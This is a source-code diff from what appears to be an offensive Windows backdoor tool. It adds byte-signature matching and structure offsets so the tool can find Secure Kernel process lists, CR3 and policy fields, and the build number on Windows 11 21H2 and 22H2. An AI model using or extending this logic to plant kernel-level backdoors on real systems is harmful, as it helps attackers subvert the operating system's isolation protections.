@@ -1709,7 +1709,7 @@ int backdoor_sk_process_list(SK_INFO *sk_info, uint64_t sk_addr_virt, sk_process
                         .text:0000000140003DB2      jnz     loc_140046B73                        
                 */
                 if ((*(p + 0x00) == 0x4c && *(p + 0x01) == 0x8d && *(p + 0x02) == 0x05 &&
-                     *(p + 0x07) == 0x48 && *(p + 0x08) == 0x8d && *(p + 0x09) == 0x8f &&
+                     *(p + 0x07) == 0x48 && *(p + 0x08) == 0x8d && *(p + 0x09) == 0x8f && *(p + 0x0a) == 0xb0 &&
                      *(p + 0x0e) == 0x4c && *(p + 0x0f) == 0x39 && *(p + 0x10) == 0x02 &&
                      *(p + 0x11) == 0x0f && *(p + 0x12) == 0x85) ||
                 /*
@@ -1721,7 +1721,7 @@ int backdoor_sk_process_list(SK_INFO *sk_info, uint64_t sk_addr_virt, sk_process
                         .text:000000014004BA20      jz      short loc_14004BA29
                 */
                      (*(p + 0x00) == 0x48 && *(p + 0x01) == 0x8d && *(p + 0x02) == 0x05 &&
-                      *(p + 0x07) == 0x48 && *(p + 0x08) == 0x81 && *(p + 0x09) == 0xc1 &&
+                      *(p + 0x07) == 0x48 && *(p + 0x08) == 0x81 && *(p + 0x09) == 0xc1 && *(p + 0x0a) == 0xb0 &&
                       *(p + 0x0e) == 0x48 && *(p + 0x0f) == 0x39 && *(p + 0x10) == 0x02 &&
                       *(p + 0x11) == 0x74))
                 {
@@ -1742,7 +1742,7 @@ int backdoor_sk_process_list(SK_INFO *sk_info, uint64_t sk_addr_virt, sk_process
                         .text:000000014002C3AF      jz      short loc_14002C3B8
                 */
                 else if (*(p + 0x00) == 0x4c && *(p + 0x01) == 0x8d && *(p + 0x02) == 0x05 &&
-                         *(p + 0x07) == 0x48 && *(p + 0x08) == 0x8d && *(p + 0x09) == 0x8f &&
+                         *(p + 0x07) == 0x48 && *(p + 0x08) == 0x8d && *(p + 0x09) == 0x8f && *(p + 0x0a) == 0xc8 &&
                          *(p + 0x0e) == 0x4c && *(p + 0x0f) == 0x39 && *(p + 0x10) == 0x02 &&
                          *(p + 0x11) == 0x74 && *(p + 0x12) == 0x07)
                 {
@@ -1751,6 +1751,48 @@ int backdoor_sk_process_list(SK_INFO *sk_info, uint64_t sk_addr_virt, sk_process
                     sk_process_cr3      = 0x0038;
                     sk_process_list     = 0x00c8;
                     sk_process_policy   = 0x0168;
+
+                    matched = true;
+                }
+                /*
+                    Windows 11 21H2 and later variation:
+
+                        .text:000000014002C39E      lea     r8, SkpsProcessList
+                        .text:000000014002C3A5      lea     rcx, [rdi+0D0h]
+                        .text:000000014002C3AC      cmp     [rdx], r8
+                        .text:000000014002C3AF      jz      short loc_14002C3B8
+                */
+                else if (*(p + 0x00) == 0x4c && *(p + 0x01) == 0x8d && *(p + 0x02) == 0x05 &&
+                         *(p + 0x07) == 0x48 && *(p + 0x08) == 0x8d && *(p + 0x09) == 0x8f && *(p + 0x0a) == 0xd0 &&
+                         *(p + 0x0e) == 0x4c && *(p + 0x0f) == 0x39 && *(p + 0x10) == 0x02 &&
+                         *(p + 0x11) == 0x74 && *(p + 0x12) == 0x07)
+                {
+                    sk_process_flags    = 0x0000;
+                    sk_process_pid      = 0x0038;
+                    sk_process_cr3      = 0x0040;
+                    sk_process_list     = 0x00d0;
+                    sk_process_policy   = 0x0170;
+
+                    matched = true;
+                }
+                /*
+                    Windows 11 22H2 and later variation:
+
+                        .text:000000014002C39E      lea     r8, SkpsProcessList
+                        .text:000000014002C3A5      lea     rcx, [rdi+0E0h]
+                        .text:000000014002C3AC      cmp     [rdx], r8
+                        .text:000000014002C3AF      jz      short loc_14002C3B8
+                */
+                else if (*(p + 0x00) == 0x4c && *(p + 0x01) == 0x8d && *(p + 0x02) == 0x05 &&
+                         *(p + 0x07) == 0x48 && *(p + 0x08) == 0x8d && *(p + 0x09) == 0x8f && *(p + 0x0a) == 0xe0 &&
+                         *(p + 0x0e) == 0x4c && *(p + 0x0f) == 0x39 && *(p + 0x10) == 0x02 &&
+                         *(p + 0x11) == 0x74 && *(p + 0x12) == 0x07)
+                {
+                    sk_process_flags    = 0x0000;
+                    sk_process_pid      = 0x0038;
+                    sk_process_cr3      = 0x0040;
+                    sk_process_list     = 0x00e0;
+                    sk_process_policy   = 0x01b8;
 
                     matched = true;
                 }
@@ -1798,6 +1840,22 @@ int backdoor_sk_process_list(SK_INFO *sk_info, uint64_t sk_addr_virt, sk_process
             {
                 // get build number
                 build = *(uint32_t *)(p + 0x10);
+            }
+            /*
+                The same signature for Windows 11:
+
+                    .text:00000001400B9608      mov     r9d, [rcx]
+                    .text:00000001400B960B      xor     r10d, r10d
+                    .text:00000001400B960E      mov     r8, rcx
+                    .text:00000001400B9611      mov     qword ptr [rcx+4], 0Ah
+                    .text:00000001400B9619      mov     dword ptr [rcx+0Ch], 271Bh
+                    .text:00000001400B9620      mov     dword ptr [rcx+10h], 2
+            */
+            else if (*(p + 0x09) == 0x48 && *(p + 0x0a) == 0xc7 && *(p + 0x0b) == 0x41 && *(p + 0x0c) == 0x04 &&
+                     *(p + 0x11) == 0xc7 && *(p + 0x12) == 0x41 && *(p + 0x13) == 0x0c)
+            {
+                // get build number
+                build = *(uint32_t *)(p + 0x14);
             }
         }
         else
